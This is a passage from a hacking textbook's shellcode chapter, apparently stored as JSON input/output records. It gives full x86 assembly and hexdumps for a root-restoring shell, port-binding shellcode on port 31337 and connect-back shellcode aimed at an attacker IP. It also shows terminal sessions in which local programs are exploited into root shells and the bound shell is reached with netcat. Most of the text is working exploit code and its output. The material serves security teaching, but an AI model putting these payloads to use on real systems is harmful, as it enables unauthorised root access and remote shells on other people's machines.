0x500\nint setresuid(uid_t ruid, uid_t euid, uid_t suid);\nint setresgid(gid_t rgid, gid_t egid, gid_t sgid);\nDESCRIPTION\nsetresuid() sets the real user ID, the effective user ID, and the saved\nset-user-ID of the current process.\nThe following shellcode makes a call to setresuid() before spawning the\nshell to restore root privileges.\npriv_shell.s\nBITS 32\n; setresuid(uid_t ruid, uid_t euid, uid_t suid);\nxor eax, eax ; Zero out eax.\nxor ebx, ebx ; Zero out ebx.\nxor ecx, ecx ; Zero out ecx.\nxor edx, edx ; Zero out edx.\nmov al, 0xa4 ; 164 (0xa4) for syscall #164\nint 0x80 ; setresuid(0, 0, 0) Restore all root privs.\n; execve(const char *filename, char *const argv [], char *const envp[])\nxor eax, eax ; Make sure eax is zeroed again.\nmov al, 11 ; syscall #11\npush ecx ; push some nulls for string termination.\npush 0x68732f2f ; push \"//sh\" to the stack.\npush 0x6e69622f ; push \"/bin\" to the stack.\nmov ebx, esp ; Put the address of \"/bin//sh\" into ebx via esp.\npush ecx ; push 32-bit null terminator to stack.\nmov edx, esp ; This is an empty array for envp.\npush ebx ; push string addr to stack above null terminator.\nmov ecx, esp ; This is the argv array with string ptr.\nint 0x80 ; execve(\"/bin//sh\", [\"/bin//sh\", NULL], [NULL])\nThis way, even if a program is running under lowered privileges when it’s\nexploited, the shellcode can restore the privileges. This effect is demonstrated\nbelow by exploiting the same program with dropped privileges.\nreader@hacking:~/booksrc $ nasm priv_shell.s\nreader@hacking:~/booksrc $ export SHELLCODE=$(cat priv_shell)\nreader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./drop_privs\nSHELLCODE will be at 0xbffff9bf\nreader@hacking:~/booksrc $ ./drop_privs $(perl -e 'print \"\\xbf\\xf9\\xff\\xbf\"x40')\nsh-3.2# whoami\nroot\nsh-3.2# id\nuid=0(root) gid=999(reader)\ngroups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),104(scan\nner),112(netdev),113(lpadmin),115(powerdev),117(admin),999(reader)\nsh-3.2#\nShellcode 301"
  },
  {
    "input": "0x532 And Smaller Still",
    "output": "0x532 And Smaller Still\nA few more bytes can still be shaved off this shellcode. There is a single-byte\nx86 instruction called cdq, which stands for convert doubleword to quadword.\nInstead of using operands, this instruction always gets its source from the\nEAX register and stores the results between the EDX and EAX registers. Since\nthe registers are 32-bit doublewords, it takes two registers to store a 64-bit\nquadword. The conversion is simply a matter of extending the sign bit from a\n32-bit integer to 64-bit integer. Operationally, this means if the sign bit of EAX\nis 0, the cdq instruction will zero the EDX register. Using xor to zero the EDX\nregister requires two bytes; so, if EAX is already zeroed, using the cdq instruction\nto zero EDX will save one byte\n31 D2 xor edx,edx\ncompared to\n99 cdq\nAnother byte can be saved with clever use of the stack. Since the stack is\n32-bit aligned, a single byte value pushed to the stack will be aligned as a\ndoubleword. When this value is popped off, it will be sign-extended, filling\nthe entire register. The instructions that push a single byte and pop it back\ninto a register take three bytes, while using xor to zero the register and moving\na single byte takes four bytes\n31 C0 xor eax,eax\nB0 0B mov al,0xb\ncompared to\n6A 0B push byte +0xb\n58 pop eax\nThese tricks (shown in bold) are used in the following shellcode listing.\nThis assembles into the same shellcode as that used in the previous chapters.\nshellcode.s\nBITS 32\n; setresuid(uid_t ruid, uid_t euid, uid_t suid);\nxor eax, eax ; Zero out eax.\nxor ebx, ebx ; Zero out ebx.\nxor ecx, ecx ; Zero out ecx.\ncdq ; Zero out edx using the sign bit from eax.\nmov BYTE al, 0xa4 ; syscall 164 (0xa4)\nint 0x80 ; setresuid(0, 0, 0) Restore all root privs.\n; execve(const char *filename, char *const argv [], char *const envp[])\n302 0x500"
  },
  {
    "input": "0x540 Port-Binding Shellcode",
    "output": "push BYTE 11 ; push 11 to the stack.\npop eax ; pop the dword of 11 into eax.\npush ecx ; push some nulls for string termination.\npush 0x68732f2f ; push \"//sh\" to the stack.\npush 0x6e69622f ; push \"/bin\" to the stack.\nmov ebx, esp ; Put the address of \"/bin//sh\" into ebx via esp.\npush ecx ; push 32-bit null terminator to stack.\nmov edx, esp ; This is an empty array for envp.\npush ebx ; push string addr to stack above null terminator.\nmov ecx, esp ; This is the argv array with string ptr.\nint 0x80 ; execve(\"/bin//sh\", [\"/bin//sh\", NULL], [NULL])\nThe syntax for pushing a single byte requires the size to be declared.\nValid sizes are BYTE for one byte, WORD for two bytes, and DWORD for four bytes.\nThese sizes can be implied from register widths, so moving into the AL\nregister implies the BYTE size. While it’s not necessary to use a size in all\nsituations, itdoesn’t hurt and can help readability.\n0x540 Port-Binding Shellcode\nWhen exploiting a remote program, the shellcode we’ve designed so far won’t\nwork. The injected shellcode needs to communicate over the network to\ndeliver an interactive root prompt. Port-binding shellcode will bind the shell\nto a network port where it listens for incoming connections. In the previous\nchapter, we used this kind of shellcode to exploit the tinyweb server. The\nfollowing C code binds to port 31337 and listens for a TCP connection.\nbind_port.c\n#include <unistd.h>\n#include <string.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\nint main(void) {\nint sockfd, new_sockfd; // Listen on sock_fd, new connection on new_fd\nstruct sockaddr_in host_addr, client_addr; // My address information\nsocklen_t sin_size;\nint yes=1;\nsockfd = socket(PF_INET, SOCK_STREAM, 0);\nhost_addr.sin_family = AF_INET; // Host byte order\nhost_addr.sin_port = htons(31337); // Short, network byte order\nhost_addr.sin_addr.s_addr = INADDR_ANY; // Automatically fill with my IP.\nmemset(&(host_addr.sin_zero), '\\0', 8); // Zero the rest of the struct.\nbind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr));\nlisten(sockfd, 4);\nShellcode 303\nsin_size = sizeof(struct sockaddr_in);\nnew_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);\n}\nThese familiar socket functions can all be accessed with a single Linux\nsystem call, aptly named socketcall(). This is syscall number 102, which has a\nslightly cryptic manual page.\nreader@hacking:~/booksrc $ grep socketcall /usr/include/asm-i386/unistd.h\n#define __NR_socketcall 102\nreader@hacking:~/booksrc $ man 2 socketcall\nIPC(2) Linux Programmer's Manual IPC(2)\nNAME\nsocketcall - socket system calls\nSYNOPSIS\nint socketcall(int call, unsigned long *args);\nDESCRIPTION\nsocketcall() is a common kernel entry point for the socket system calls. call\ndetermines which socket function to invoke. args points to a block containing\nthe actual arguments, which are passed through to the appropriate call.\nUser programs should call the appropriate functions by their usual\nnames. Only standard library implementors and kernel hackers need to\nknow about socketcall().\nThe possible call numbers for the first argument are listed in the\nlinux/net.h include file.\nFrom /usr/include/linux/net.h\n#define SYS_SOCKET 1 /* sys_socket(2) */\n#define SYS_BIND 2 /* sys_bind(2) */\n#define SYS_CONNECT 3 /* sys_connect(2) */\n#define SYS_LISTEN 4 /* sys_listen(2) */\n#define SYS_ACCEPT 5 /* sys_accept(2) */\n#define SYS_GETSOCKNAME 6 /* sys_getsockname(2) */\n#define SYS_GETPEERNAME 7 /* sys_getpeername(2) */\n#define SYS_SOCKETPAIR 8 /* sys_socketpair(2) */\n#define SYS_SEND 9 /* sys_send(2) */\n#define SYS_RECV 10 /* sys_recv(2) */\n#define SYS_SENDTO 11 /* sys_sendto(2) */\n#define SYS_RECVFROM 12 /* sys_recvfrom(2) */\n#define SYS_SHUTDOWN 13 /* sys_shutdown(2) */\n#define SYS_SETSOCKOPT 14 /* sys_setsockopt(2) */\n#define SYS_GETSOCKOPT 15 /* sys_getsockopt(2) */\n#define SYS_SENDMSG 16 /* sys_sendmsg(2) */\n#define SYS_RECVMSG 17 /* sys_recvmsg(2) */\n304 0x500\nSo, to make socket system calls using Linux, EAX is always 102 for\nsocketcall(), EBX contains the type of socket call, and ECX is a pointer to\nthe socket call’s arguments. The calls are simple enough, but some of them\nrequire a sockaddr structure, which must be built by the shellcode. Debugging\nthe compiled C code is the most direct way to look at this structure in memory.\nreader@hacking:~/booksrc $ gcc -g bind_port.c\nreader@hacking:~/booksrc $ gdb -q ./a.out\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n(gdb) list 18\n13 sockfd = socket(PF_INET, SOCK_STREAM, 0);\n14\n15 host_addr.sin_family = AF_INET; // Host byte order\n16 host_addr.sin_port = htons(31337); // Short, network byte order\n17 host_addr.sin_addr.s_addr = INADDR_ANY; // Automatically fill with my IP.\n18 memset(&(host_addr.sin_zero), '\\0', 8); // Zero the rest of the struct.\n19\n20 bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr));\n21\n22 listen(sockfd, 4);\n(gdb) break 13\nBreakpoint 1 at 0x804849b: file bind_port.c, line 13.\n(gdb) break 20\nBreakpoint 2 at 0x80484f5: file bind_port.c, line 20.\n(gdb) run\nStarting program: /home/reader/booksrc/a.out\nBreakpoint 1, main () at bind_port.c:13\n13 sockfd = socket(PF_INET, SOCK_STREAM, 0);\n(gdb) x/5i $eip\n0x804849b <main+23>: mov DWORD PTR [esp+8],0x0\n0x80484a3 <main+31>: mov DWORD PTR [esp+4],0x1\n0x80484ab <main+39>: mov DWORD PTR [esp],0x2\n0x80484b2 <main+46>: call 0x8048394 <socket@plt>\n0x80484b7 <main+51>: mov DWORD PTR [ebp-12],eax\n(gdb)\nThe first breakpoint is just before the socket call happens, since we\nneed to check the values of PF_INET and SOCK_STREAM. All three arguments are\npushed to the stack (but with mov instructions) in reverse order. This means\nPF_INET is 2 and SOCK_STREAM is 1.\n(gdb) cont\nContinuing.\nBreakpoint 2, main () at bind_port.c:20\n20 bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr));\n(gdb) print host_addr\n$1 = {sin_family = 2, sin_port = 27002, sin_addr = {s_addr = 0},\nsin_zero = \"\\000\\000\\000\\000\\000\\000\\000\"}\n(gdb) print sizeof(struct sockaddr)\nShellcode 305\n$2 = 16\n(gdb) x/16xb &host_addr\n0xbffff780: 0x02 0x00 0x7a 0x69 0x00 0x00 0x00 0x00\n0xbffff788: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00\n(gdb) p /x 27002\n$3 = 0x697a\n(gdb) p 0x7a69\n$4 = 31337\n(gdb)\nThe next breakpoint happens after the sockaddr structure is filled with\nvalues. The debugger is smart enough to decode the elements of the structure\nwhen host_addr is printed, but now you need to be smart enough to realize the\nport is stored in network byte order. The sin_family and sin_port elements are\nboth words, followed by the address as a DWORD. In this case, the address is 0,\nwhich means any address can be used for binding. The remaining eight bytes\nafter that are just extra space in the structure. The first eight bytes in the\nstructure (shown in bold) contain all the important information.\nThe following assembly instructions perform all the socket calls needed\nto bind to port 31337 and accept TCP connections. The sockaddr structure and\nthe argument arrays are each created by pushing values in reverse order to the\nstack and then copying ESP into ECX. The last eight bytes of the sockaddr\nstructure aren’t actually pushed to the stack, since they aren’t used. Whatever\nrandom eight bytes happen to be on the stack will occupy this space, which\nisfine.\nbind_port.s\nBITS 32\n; s = socket(2, 1, 0)\npush BYTE 0x66 ; socketcall is syscall #102 (0x66).\npop eax\ncdq ; Zero out edx for use as a null DWORD later.\nxor ebx, ebx ; ebx is the type of socketcall.\ninc ebx ; 1 = SYS_SOCKET = socket()\npush edx ; Build arg array: { protocol = 0,\npush BYTE 0x1 ; (in reverse) SOCK_STREAM = 1,\npush BYTE 0x2 ; AF_INET = 2 }\nmov ecx, esp ; ecx = ptr to argument array\nint 0x80 ; After syscall, eax has socket file descriptor.\nmov esi, eax ; save socket FD in esi for later\n; bind(s, [2, 31337, 0], 16)\npush BYTE 0x66 ; socketcall (syscall #102)\npop eax\ninc ebx ; ebx = 2 = SYS_BIND = bind()\npush edx ; Build sockaddr struct: INADDR_ANY = 0\npush WORD 0x697a ; (in reverse order) PORT = 31337\npush WORD bx ; AF_INET = 2\nmov ecx, esp ; ecx = server struct pointer\n306 0x500"
  },
  {
    "input": "0x541 Duplicating Standard File Descriptors",
    "output": "push BYTE 16 ; argv: { sizeof(server struct) = 16,\npush ecx ; server struct pointer,\npush esi ; socket file descriptor }\nmov ecx, esp ; ecx = argument array\nint 0x80 ; eax = 0 on success\n; listen(s, 0)\nmov BYTE al, 0x66 ; socketcall (syscall #102)\ninc ebx\ninc ebx ; ebx = 4 = SYS_LISTEN = listen()\npush ebx ; argv: { backlog = 4,\npush esi ; socket fd }\nmov ecx, esp ; ecx = argument array\nint 0x80\n; c = accept(s, 0, 0)\nmov BYTE al, 0x66 ; socketcall (syscall #102)\ninc ebx ; ebx = 5 = SYS_ACCEPT = accept()\npush edx ; argv: { socklen = 0,\npush edx ; sockaddr ptr = NULL,\npush esi ; socket fd }\nmov ecx, esp ; ecx = argument array\nint 0x80 ; eax = connected socket FD\nWhen assembled and used in an exploit, this shellcode will bind to\nport 31337 and wait for an incoming connection, blocking at the accept call.\nWhen a connection is accepted, the new socket file descriptor is put into EAX\nat the end of this code. This won’t really be useful until it’s combined with\nthe shell-spawning code described earlier. Fortunately, standard file descrip-\ntors make this fusion remarkably simple.\n0x541 Duplicating Standard File Descriptors\nStandard input, standard output, and standard error are the three standard\nfile descriptors used by programs to perform standard I/O. Sockets, too, are\njust file descriptors that can be read from and written to. By simply swapping\nthe standard input, output, and error of the spawned shell with the connected\nsocket file descriptor, the shell will write output and errors to the socket and\nread its input from the bytes that the socket received. There is a system call\nspecifically for duplicating file descriptors, called dup2. This is system call\nnumber 63.\nreader@hacking:~/booksrc $ grep dup2 /usr/include/asm-i386/unistd.h\n#define __NR_dup2 63\nreader@hacking:~/booksrc $ man 2 dup2\nDUP(2) Linux Programmer's Manual DUP(2)\nNAME\ndup, dup2 - duplicate a file descriptor\nSYNOPSIS\n#include <unistd.h>\nShellcode 307\nint dup(int oldfd);\nint dup2(int oldfd, int newfd);\nDESCRIPTION\ndup() and dup2() create a copy of the file descriptor oldfd.\ndup2() makes newfd be the copy of oldfd, closing newfd first if necessary.\nThe bind_port.s shellcode left off with the connected socket file descriptor\nin EAX. The following instructions are added in the file bind_shell_beta.s to\nduplicate this socket into the standard I/O file descriptors; then, the tiny_shell\ninstructions are called to execute a shell in the current process. The spawned\nshell’s standard input and output file descriptors will be the TCP connection,\nallowing remote shell access.\nNew Instructions from bind_shell1.s\n; dup2(connected socket, {all three standard I/O file descriptors})\nmov ebx, eax ; Move socket FD in ebx.\npush BYTE 0x3F ; dup2 syscall #63\npop eax\nxor ecx, ecx ; ecx = 0 = standard input\nint 0x80 ; dup(c, 0)\nmov BYTE al, 0x3F ; dup2 syscall #63\ninc ecx ; ecx = 1 = standard output\nint 0x80 ; dup(c, 1)\nmov BYTE al, 0x3F ; dup2 syscall #63\ninc ecx ; ecx = 2 = standard error\nint 0x80 ; dup(c, 2)\n; execve(const char *filename, char *const argv [], char *const envp[])\nmov BYTE al, 11 ; execve syscall #11\npush edx ; push some nulls for string termination.\npush 0x68732f2f ; push \"//sh\" to the stack.\npush 0x6e69622f ; push \"/bin\" to the stack.\nmov ebx, esp ; Put the address of \"/bin//sh\" into ebx via esp.\npush ecx ; push 32-bit null terminator to stack.\nmov edx, esp ; This is an empty array for envp.\npush ebx ; push string addr to stack above null terminator.\nmov ecx, esp ; This is the argv array with string ptr.\nint 0x80 ; execve(\"/bin//sh\", [\"/bin//sh\", NULL], [NULL])\nWhen this shellcode is assembled and used in an exploit, it will bind to\nport 31337 and wait for an incoming connection. In the output below, grep\nis used to quickly check for null bytes. At the end, the process hangs waiting\nfor a connection.\nreader@hacking:~/booksrc $ nasm bind_shell_beta.s\nreader@hacking:~/booksrc $ hexdump -C bind_shell_beta | grep --color=auto 00\n00000000 6a 66 58 99 31 db 43 52 6a 01 6a 02 89 e1 cd 80 |jfX.1.CRj.j.....|\n00000010 89 c6 6a 66 58 43 52 66 68 7a 69 66 53 89 e1 6a |..jfXCRfhzifS..j|\n00000020 10 51 56 89 e1 cd 80 b0 66 43 43 53 56 89 e1 cd |.QV.....fCCSV...|\n308 0x500"
  },
  {
    "input": "0x542 Branching Control Structures",
    "output": "00000030 80 b0 66 43 52 52 56 89 e1 cd 80 89 c3 6a 3f 58 |..fCRRV......j?X|\n00000040 31 c9 cd 80 b0 3f 41 cd 80 b0 3f 41 cd 80 b0 0b |1....?A...?A....|\n00000050 52 68 2f 2f 73 68 68 2f 62 69 6e 89 e3 52 89 e2 |Rh//shh/bin..R..|\n00000060 53 89 e1 cd 80 |S....|\n00000065\nreader@hacking:~/booksrc $ export SHELLCODE=$(cat bind_shell_beta)\nreader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./notesearch\nSHELLCODE will be at 0xbffff97f\nreader@hacking:~/booksrc $ ./notesearch $(perl -e 'print \"\\x7f\\xf9\\xff\\xbf\"x40')\n[DEBUG] found a 33 byte note for user id 999\n-------[ end of note data ]-------\nFrom another terminal window, the program netstat is used to find the\nlistening port. Then, netcat is used to connect to the root shell on that port.\nreader@hacking:~/booksrc $ sudo netstat -lp | grep 31337\ntcp 0 0 *:31337 *:* LISTEN 25604/notesearch\nreader@hacking:~/booksrc $ nc -vv 127.0.0.1 31337\nlocalhost [127.0.0.1] 31337 (?) open\nwhoami\nroot\n0x542 Branching Control Structures\nThe control structures of the C programming language, such as for loops\nand if-then-else blocks, are made up of conditional branches and loops in the\nmachine language. With control structures, the repeated calls to dup2 could be\nshrunk down to a single call in a loop. The first C program written in previous\nchapters used a for loop to greet the world 10 times. Disassembling the main\nfunction will show us how the compiler implemented the for loop using assem-\nbly instructions. The loop instructions (shown below in bold) come after the\nfunction prologue instructions save stack memory for the local variable i.\nThis variable is referenced in relation to the EBP register as [ebp-4].\nreader@hacking:~/booksrc $ gcc firstprog.c\nreader@hacking:~/booksrc $ gdb -q ./a.out\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n(gdb) disass main\nDump of assembler code for function main:\n0x08048374 <main+0>: push ebp\n0x08048375 <main+1>: mov ebp,esp\n0x08048377 <main+3>: sub esp,0x8\n0x0804837a <main+6>: and esp,0xfffffff0\n0x0804837d <main+9>: mov eax,0x0\n0x08048382 <main+14>: sub esp,eax\n0x08048384 <main+16>: mov DWORD PTR [ebp-4],0x0\n0x0804838b <main+23>: cmp DWORD PTR [ebp-4],0x9\n0x0804838f <main+27>: jle 0x8048393 <main+31>\n0x08048391 <main+29>: jmp 0x80483a6 <main+50>\n0x08048393 <main+31>: mov DWORD PTR [esp],0x8048484\n0x0804839a <main+38>: call 0x80482a0 <printf@plt>\nShellcode 309\n0x0804839f <main+43>: lea eax,[ebp-4]\n0x080483a2 <main+46>: inc DWORD PTR [eax]\n0x080483a4 <main+48>: jmp 0x804838b <main+23>\n0x080483a6 <main+50>: leave\n0x080483a7 <main+51>: ret\nEnd of assembler dump.\n(gdb)\nThe loop contains two new instructions: cmp (compare) and jle (jump if\nless than or equal to), the latter belonging to the family of conditional jump\ninstructions. The cmp instruction will compare its two operands, setting flags\nbased on the result. Then, a conditional jump instruction will jump based on\nthe flags. In the code above, if the value at [ebp-4] is less than or equal to 9,\nexecution will jump to 0x8048393, past the next jmp instruction. Otherwise, the\nnext jmp instruction brings execution to the end of the function at 0x080483a6,\nexiting the loop. The body of the loop makes the call to printf(), increments\nthe counter variable at [ebp-4], and finally jumps back to the compare instruc-\ntion to continue the loop. Using conditional jump instructions, complex\nprogramming control structures such as loops can be created in assembly.\nMore conditional jump instructions are shown below.\nInstruction Description\ncmp <dest>, <source> Compare the destination operand with the source, setting flags for use\nwith a conditional jump instruction.\nje <target> Jump to target if the compared values are equal.\njne <target> Jump if not equal.\njl <target> Jump if less than.\njle <target> Jump if less than or equal to.\njnl <target> Jump if not less than.\njnle <target> Jump if not less than or equal to.\njg jge Jump if greater than, or greater than or equal to.\njng jnge Jump if not greater than, or not greater than or equal to.\nThese instructions can be used to shrink the dup2 portion of the shellcode\ndown to the following:\n; dup2(connected socket, {all three standard I/O file descriptors})\nmov ebx, eax ; Move socket FD in ebx.\nxor eax, eax ; Zero eax.\nxor ecx, ecx ; ecx = 0 = standard input\ndup_loop:\nmov BYTE al, 0x3F ; dup2 syscall #63\nint 0x80 ; dup2(c, 0)\ninc ecx\ncmp BYTE cl, 2 ; Compare ecx with 2.\njle dup_loop ; If ecx <= 2, jump to dup_loop.\n310 0x500\nThis loop iterates ECX from 0 to 2, making a call to dup2 each time. With\na more complete understanding of the flags used by the cmp instruction, this\nloop can be shrunk even further. The status flags set by the cmp instruction are\nalso set by most other instructions, describing the attributes of the instruction’s\nresult. These flags are carry flag (CF), parity flag (PF), adjust flag (AF), over-\nflow flag (OF), zero flag (ZF), and sign flag (SF). The last two flags are the\nmost useful and the easiest to understand. The zero flag is set to true if the\nresult is zero, otherwise it is false. The sign flag is simply the most significant\nbit of the result, which is true if the result is negative and false otherwise.\nThis means that, after any instruction with a negative result, the sign flag\nbecomes true and the zero flag becomes false.\nAbbreviation Name Description\nZF zero flag True if the result is zero.\nSF sign flag True if the result is negative (equal to the most significant bit of result).\nThe cmp (compare) instruction is actually just a sub (subtract) instruction\nthat throws away the results, only affecting the status flags. The jle (jump if\nless than or equal to) instruction is actually checking the zero and sign flags.\nIf either of these flags is true, then the destination (first) operand is less than\nor equal to the source (second) operand. The other conditional jump instruc-\ntions work in a similar way, and there are still more conditional jump\ninstructions that directly check individual status flags:\nInstruction Description\njz <target> Jump to target if the zero flag is set.\njnz <target> Jump if the zero flag is not set.\njs <target> Jump if the sign flag is set.\njns <target> Jump is the sign flag is not set.\nWith this knowledge, the cmp (compare) instruction can be removed\nentirely if the loop’s order is reversed. Starting from 2 and counting down,\nthe sign flag can be checked to loop until 0. The shortened loop is shown\nbelow, with the changes shown in bold.\n; dup2(connected socket, {all three standard I/O file descriptors})\nmov ebx, eax ; Move socket FD in ebx.\nxor eax, eax ; Zero eax.\npush BYTE 0x2 ; ecx starts at 2.\npop ecx\ndup_loop:\nmov BYTE al, 0x3F ; dup2 syscall #63\nint 0x80 ; dup2(c, 0)\ndec ecx ; Count down to 0.\njns dup_loop ; If the sign flag is not set, ecx is not negative.\nShellcode 311\nThe first two instructions before the loop can be shortened with the xchg\n(exchange) instruction. This instruction swaps the values between the source\nand destination operands:\nInstruction Description\nxchg <dest>, <source> Exchange the values between the two operands.\nThis single instruction can replace both of the following instructions,\nwhich take up four bytes:\n89 C3 mov ebx,eax\n31 C0 xor eax,eax\nThe EAX register needs to be zeroed to clear only the upper three bytes\nof the register, and EBX already has these upper bytes cleared. So swapping\nthe values between EAX and EBX will kill two birds with one stone, reduc-\ning the size to the following single-byte instruction:\n93 xchg eax,ebx\nSince the xchg instruction is actually smaller than a mov instruction between\ntwo registers, it can be used to shrink shellcode in other places. Naturally, this\nonly works in situations where the source operand’s register doesn’t matter.\nThe following version of the bind port shellcode uses the exchange instruction\nto shave a few more bytes off its size.\nbind_shell.s\nBITS 32\n; s = socket(2, 1, 0)\npush BYTE 0x66 ; socketcall is syscall #102 (0x66).\npop eax\ncdq ; Zero out edx for use as a null DWORD later.\nxor ebx, ebx ; Ebx is the type of socketcall.\ninc ebx ; 1 = SYS_SOCKET = socket()\npush edx ; Build arg array: { protocol = 0,\npush BYTE 0x1 ; (in reverse) SOCK_STREAM = 1,\npush BYTE 0x2 ; AF_INET = 2 }\nmov ecx, esp ; ecx = ptr to argument array\nint 0x80 ; After syscall, eax has socket file descriptor.\nxchg esi, eax ; Save socket FD in esi for later.\n; bind(s, [2, 31337, 0], 16)\npush BYTE 0x66 ; socketcall (syscall #102)\npop eax\ninc ebx ; ebx = 2 = SYS_BIND = bind()\n312 0x500\npush edx ; Build sockaddr struct: INADDR_ANY = 0\npush WORD 0x697a ; (in reverse order) PORT = 31337\npush WORD bx ; AF_INET = 2\nmov ecx, esp ; ecx = server struct pointer\npush BYTE 16 ; argv: { sizeof(server struct) = 16,\npush ecx ; server struct pointer,\npush esi ; socket file descriptor }\nmov ecx, esp ; ecx = argument array\nint 0x80 ; eax = 0 on success\n; listen(s, 0)\nmov BYTE al, 0x66 ; socketcall (syscall #102)\ninc ebx\ninc ebx ; ebx = 4 = SYS_LISTEN = listen()\npush ebx ; argv: { backlog = 4,\npush esi ; socket fd }\nmov ecx, esp ; ecx = argument array\nint 0x80\n; c = accept(s, 0, 0)\nmov BYTE al, 0x66 ; socketcall (syscall #102)\ninc ebx ; ebx = 5 = SYS_ACCEPT = accept()\npush edx ; argv: { socklen = 0,\npush edx ; sockaddr ptr = NULL,\npush esi ; socket fd }\nmov ecx, esp ; ecx = argument array\nint 0x80 ; eax = connected socket FD\n; dup2(connected socket, {all three standard I/O file descriptors})\nxchg eax, ebx ; Put socket FD in ebx and 0x00000005 in eax.\npush BYTE 0x2 ; ecx starts at 2.\npop ecx\ndup_loop:\nmov BYTE al, 0x3F ; dup2 syscall #63\nint 0x80 ; dup2(c, 0)\ndec ecx ; count down to 0\njns dup_loop ; If the sign flag is not set, ecx is not negative.\n; execve(const char *filename, char *const argv [], char *const envp[])\nmov BYTE al, 11 ; execve syscall #11\npush edx ; push some nulls for string termination.\npush 0x68732f2f ; push \"//sh\" to the stack.\npush 0x6e69622f ; push \"/bin\" to the stack.\nmov ebx, esp ; Put the address of \"/bin//sh\" into ebx via esp.\npush edx ; push 32-bit null terminator to stack.\nmov edx, esp ; This is an empty array for envp.\npush ebx ; push string addr to stack above null terminator.\nmov ecx, esp ; This is the argv array with string ptr\nint 0x80 ; execve(\"/bin//sh\", [\"/bin//sh\", NULL], [NULL])\nThis assembles to the same 92-byte bind_shell shellcode used in the\nprevious chapter.\nShellcode 313"
  },
  {
    "input": "0x550 Connect-Back Shellcode",
    "output": "reader@hacking:~/booksrc $ nasm bind_shell.s\nreader@hacking:~/booksrc $ hexdump -C bind_shell\n00000000 6a 66 58 99 31 db 43 52 6a 01 6a 02 89 e1 cd 80 |jfX.1.CRj.j.....|\n00000010 96 6a 66 58 43 52 66 68 7a 69 66 53 89 e1 6a 10 |.jfXCRfhzifS..j.|\n00000020 51 56 89 e1 cd 80 b0 66 43 43 53 56 89 e1 cd 80 |QV.....fCCSV....|\n00000030 b0 66 43 52 52 56 89 e1 cd 80 93 6a 02 59 b0 3f |.fCRRV.....j.Y.?|\n00000040 cd 80 49 79 f9 b0 0b 52 68 2f 2f 73 68 68 2f 62 |..Iy...Rh//shh/b|\n00000050 69 6e 89 e3 52 89 e2 53 89 e1 cd 80 |in..R..S....|\n0000005c\nreader@hacking:~/booksrc $ diff bind_shell portbinding_shellcode\n0x550 Connect-Back Shellcode\nPort-binding shellcode is easily foiled by firewalls. Most firewalls will block\nincoming connections, except for certain ports with known services. This limits\nthe user’s exposure and will prevent port-binding shellcode from receiving a\nconnection. Software firewalls are now so common that port-bind shellcode\nhas little chance of actually working in the wild.\nHowever, firewalls typically do not filter outbound connections, since that\nwould hinder usability. From inside the firewall, a user should be able to access\nany web page or make any other outbound connections. This means that if\nthe shellcode initiates the outbound connection, most firewalls will allow it.\nInstead of waiting for a connection from an attacker, connect-back shell-\ncode initiates a TCP connection back to the attacker’s IP address. Opening a\nTCP connection only requires a call to socket() and a call to connect(). This is\nvery similar to the bind-port shellcode, since the socket call is exactly the same\nand the connect() call takes the same type of arguments as bind(). The following\nconnect-back shellcode was made from the bind-port shellcode with a few\nmodifications (shown in bold).\nconnectback_shell.s\nBITS 32\n; s = socket(2, 1, 0)\npush BYTE 0x66 ; socketcall is syscall #102 (0x66).\npop eax\ncdq ; Zero out edx for use as a null DWORD later.\nxor ebx, ebx ; ebx is the type of socketcall.\ninc ebx ; 1 = SYS_SOCKET = socket()\npush edx ; Build arg array: { protocol = 0,\npush BYTE 0x1 ; (in reverse) SOCK_STREAM = 1,\npush BYTE 0x2 ; AF_INET = 2 }\nmov ecx, esp ; ecx = ptr to argument array\nint 0x80 ; After syscall, eax has socket file descriptor.\nxchg esi, eax ; Save socket FD in esi for later.\n; connect(s, [2, 31337, <IP address>], 16)\npush BYTE 0x66 ; socketcall (syscall #102)\n314 0x500\npop eax\ninc ebx ; ebx = 2 (needed for AF_INET)\npush DWORD 0x482aa8c0 ; Build sockaddr struct: IP address = 192.168.42.72\npush WORD 0x697a ; (in reverse order) PORT = 31337\npush WORD bx ; AF_INET = 2\nmov ecx, esp ; ecx = server struct pointer\npush BYTE 16 ; argv: { sizeof(server struct) = 16,\npush ecx ; server struct pointer,\npush esi ; socket file descriptor }\nmov ecx, esp ; ecx = argument array\ninc ebx ; ebx = 3 = SYS_CONNECT = connect()\nint 0x80 ; eax = connected socket FD\n; dup2(connected socket, {all three standard I/O file descriptors})\nxchg eax, ebx ; Put socket FD in ebx and 0x00000003 in eax.\npush BYTE 0x2 ; ecx starts at 2.\npop ecx\ndup_loop:\nmov BYTE al, 0x3F ; dup2 syscall #63\nint 0x80 ; dup2(c, 0)\ndec ecx ; Count down to 0.\njns dup_loop ; If the sign flag is not set, ecx is not negative.\n; execve(const char *filename, char *const argv [], char *const envp[])\nmov BYTE al, 11 ; execve syscall #11.\npush edx ; push some nulls for string termination.\npush 0x68732f2f ; push \"//sh\" to the stack.\npush 0x6e69622f ; push \"/bin\" to the stack.\nmov ebx, esp ; Put the address of \"/bin//sh\" into ebx via esp.\npush edx ; push 32-bit null terminator to stack.\nmov edx, esp ; This is an empty array for envp.\npush ebx ; push string addr to stack above null terminator.\nmov ecx, esp ; This is the argv array with string ptr.\nint 0x80 ; execve(\"/bin//sh\", [\"/bin//sh\", NULL], [NULL])\nIn the shellcode above, the connection IP address is set to 192.168.42.72,\nwhich should be the IP address of the attacking machine. This address is stored\nin the in_addr structure as 0x482aa8c0, which is the hexadecimal representa-\ntion of 72, 42, 168, and 192. This is made clear when each number is displayed\nin hexadecimal:\nreader@hacking:~/booksrc $ gdb -q\n(gdb) p /x 192\n$1 = 0xc0\n(gdb) p /x 168\n$2 = 0xa8\n(gdb) p /x 42\n$3 = 0x2a\n(gdb) p /x 72\n$4 = 